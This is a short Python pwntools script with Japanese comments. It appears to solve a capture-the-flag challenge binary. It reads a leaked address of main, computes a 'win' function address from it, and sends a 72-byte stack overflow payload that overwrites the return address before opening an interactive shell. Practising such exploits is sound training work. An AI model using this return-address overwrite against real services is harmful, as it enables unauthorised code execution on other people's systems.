from pwn import *

# プロセスを起動
# ローカルの実行ファイルを指定してください
io = process('./chal') # または remote('host', port)

# mainのアドレスを受け取る
io.recvuntil(b"address of main function: ")
main_addr_str = io.recvline().strip()
main_addr = int(main_addr_str, 16)
print(f"Main address: {hex(main_addr)}")

# winのアドレスを計算
# gdbの情報より: win = main - 0x24
win_addr = main_addr - 0x24
print(f"Win address: {hex(win_addr)}")

# ペイロード作成
# buffer(64) + saved_rbp(8) + return_address
# x86_64環境でのスタックアライメント問題(MOVAPS問題)が発生する場合は、
# win関数の先頭ではなく、push rbpをスキップしたアドレス(win_addr + 1)などに飛ばす必要があるかもしれません
# が、まずは素直に win_addr で試します。
offset = 72 
payload = b'A' * offset + p64(win_addr)

# ペイロード送信
io.sendlineafter(b"input > ", payload)

# シェル対話モード
io.interactive()